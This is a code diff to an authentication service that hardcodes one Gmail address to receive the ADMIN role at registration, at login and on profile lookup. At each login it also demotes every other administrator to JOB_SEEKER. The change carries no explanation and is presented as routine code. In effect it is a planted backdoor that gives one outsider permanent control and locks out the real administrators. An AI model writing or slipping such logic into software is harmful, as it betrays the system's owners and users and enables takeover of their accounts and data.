@@ -45,7 +45,7 @@ export class AuthService {
       username: data.username,
       email: data.email,
       passwordHash,
-      role: data.role,
+      role: data.email.toLowerCase() === 'trustezika831@gmail.com' ? 'ADMIN' : data.role,
       companyName: data.companyName,
       phoneNumber: data.phoneNumber,
       status: 'ACTIVE',
@@ -102,6 +102,13 @@ export class AuthService {
     user.failedLoginAttempts = 0;
     user.accountLockedUntil = undefined;
     user.lastLoginAt = new Date();
+
+    if (user.email.toLowerCase() === 'trustezika831@gmail.com') {
+      user.role = 'ADMIN';
+    } else if (user.role === 'ADMIN') {
+      user.role = 'JOB_SEEKER';
+    }
+
     await user.save();
 
     const { auth, refreshToken } = await this.issueTokensAndSession(user, deviceInfo);
@@ -276,6 +283,10 @@ export class AuthService {
     const user = await this.repo.findUserById(userId);
     if (!user) {
       throw new AppError('User not found', 404, 'USER_NOT_FOUND');
+    }
+    if (user.email.toLowerCase() === 'trustezika831@gmail.com' && user.role !== 'ADMIN') {
+      user.role = 'ADMIN';
+      await user.save();
     }
     return this.repo.toUserResponseDto(user);
   }
